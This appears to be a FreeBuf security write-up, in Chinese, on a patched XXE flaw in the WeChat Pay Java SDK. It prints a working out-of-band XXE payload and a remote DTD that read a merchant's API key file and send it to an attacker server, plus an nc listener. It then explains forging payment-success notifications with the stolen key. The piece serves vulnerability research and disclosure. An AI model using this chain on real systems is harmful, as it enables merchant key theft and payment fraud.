@@ -1,0 +1,142 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ *** 本文作者：zjie2O71，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
+ **PS：本文仅用于技术讨论与分享，严禁用于非法用途**
+
+## 前提：
+
+之前有网友分享了微信支付SDK的XXE漏洞，语言版本为JAVA，有很多朋友问我0元购的hack思路，我查阅了一下微信支付的官方文档，配合简单的XXE做了一些攻击演示。
+
+## 漏洞详情：
+
+<http://seclists.org/fulldisclosure/2018/Jul/3>
+
+SDK受影响版本下载地址：
+
+    
+    
+    [https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip](https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip) 
+
+漏洞代码位置：
+
+com.github.wxpay.sdk.WXPayUtil.java
+
+xmlToMap函数。
+
+漏洞代码：
+
+    
+    
+    public static void main(String[] args) throws Exception {
+          String notifyData = "...."; // 支付结果通知的xml格式数据
+          MyConfig config = new MyConfig();
+          WXPay wxpay = new WXPay(config);
+          Map<String, String> notifyMap = WXPayUtil.xmlToMap(notifyData);  // 转换成map
+          if (wxpay.isPayResultNotifySignatureValid(notifyMap)) {
+              // 签名正确
+              // 进行处理。
+              // 注意特殊情况：订单已经退款，但收到了支付结果成功的通知，不应把商户侧订单状态从退款改成支付成功
+          }
+          else {
+              // 签名错误，如果数据里没有sign字段，也认为是签名错误
+          }  
+    
+
+引用位置：
+
+查看SDK给的README.md说明，其中表示在支付结果的回掉接口notify_url 处使用，内部调用截图如下：
+
+![1.png](https://image.3001.net/images/20180705/15307232969078.png!small)
+
+这里在构建notifyMap对象的时候缺陷方法被调用。
+
+为了更方便的理解演示场景，我们先在这里了解一下微信支付SDK处理支付结果的接口校验签名的过程：
+
+尝试着追踪wxpay.isPayResultNotifySignatureValid(notifyMap)，追踪到了最下面这个判断签名的函数，代码截图如下：  
+![1.png](https://image.3001.net/images/20180705/15307233727961.png!small)
+
+功能上注释已经说的很明确，我解释一下三个参数的意思，函数传递的data参数表示将外部传递来的xml数据转化为Map数据结构的对象，key是商户用来签名的API密钥，signType则表示签名的方式，为空则表示默认是md5的方式。这里是一个简单的签名校验函数，这里的关键在于key是商户定义的，而data和signType字段则都可以人为控制，所以在我构建的攻击场景里需要人为的去读取配置文件里的key值。
+
+本地场景搭建：
+
+eclipse引入下载的微信SDK支付文件，文件结果如下图所示，下图红线处是需要自己加的类：
+
+  
+![1.png](https://image.3001.net/images/20180705/15307234143948.png!small)
+
+打开看一下MyConfig.java的内容，其实是继承了WXPayConfig类，写上需要实现抽象方法即可。
+
+main.java类里面是模拟写了一次业务逻辑的函数，下面的notifyData参数就是模拟外部传入的脏数据，如下图：
+
+![1.png](https://image.3001.net/images/20180705/15307234623981.png!small)
+
+在根目录下新建演示文件，里面模拟写入key值，如下图：  
+![1.png](https://image.3001.net/images/20180705/15307235514294.png!small)
+
+利用微信的XXE漏洞：
+
+这里我放上几篇XXE漏洞利用的博客，写的蛮好的，这个环节有困难的同学可以看看。
+
+<http://www.freebuf.com/articles/web/97833.html>
+
+<http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93>
+
+<https://www.xuehua.us/2018/04/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8blind-oob-xxe%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E7%9A%84%E6%B5%8B%E8%AF%95/>
+
+类似的基础教程有很多，有不理解的可以去网上搜搜看。
+
+微信的XXE漏洞，利用流程链表如下：
+
+向商户的notify_url接口发送dtd脏数据，商户服务器加载远程dtd文件，商户服务器将key值发送至attack服务器。
+
+这里我分成了三步，我们分批次看一下：
+
+第一步：
+
+构造的恶意XXE数据，如下：
+
+<?xmlversion="1.0" encoding="utf-8"?><!DOCTYPE ANY [ <!ENTITY % payload
+SYSTEM"file:////path/key.txt"><!ENTITY % remote
+SYSTEM"[http://publicserver:8000/test2.dtd](http://103.230.240.147:8000/test2.dtd)">%remote;%all;%send;]><h>1</h>
+
+代码块如下图所示：
+
+![1.png](https://image.3001.net/images/20180705/15307236019950.png!small)第二步：
+
+远程的dtd文件内容如下：
+
+    
+    
+    <!ENTITY % all"<!ENTITY &#x25; send SYSTEM '[http://publicserver:8001/%payload](http://publicserver:8001/%25payload);'>">
+
+第三步：
+
+在publicserver上监听8001端口，观察读到的key.txt的值。
+
+指令：nc –v –l 8001
+
+运行结果如下图：
+
+![1.png](https://image.3001.net/images/20180705/15307236759292.png!small)
+
+上图中可以看到GET的路径处，我在这里回显读取到的key.txt的值，this is key value!
+
+构造微信返回值：
+
+返回值的构造参考微信给出的字段解释：
+
+[https://pay.weixin.qq.com/wiki/doc/api/native.php?chapter=9_7&index=8](https://pay.weixin.qq.com/wiki/doc/api/native.php?chapter=9_7&index=8)
+
+示例构造如下图所示：
+
+![1.png](https://image.3001.net/images/20180705/15307237175389.png!small)
+
+读取到key之后，我们在本地模拟将数据转化成Map对象与key值进行加密，加密方式不写则默认为md5，就达到了欺骗的效果。
+
+## 结尾：
+
+漏洞本身只是很简单的XXE漏洞造成的任意文件读取，因为漏洞所处的关键业务点使得造成的损失巨大，但是由于notify_url的使用过程中客户全程并不参与，所以在我看来notify_url的获取方式是该漏洞破坏性的瓶颈。
+
+ *** 本文作者：zjie2O71，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
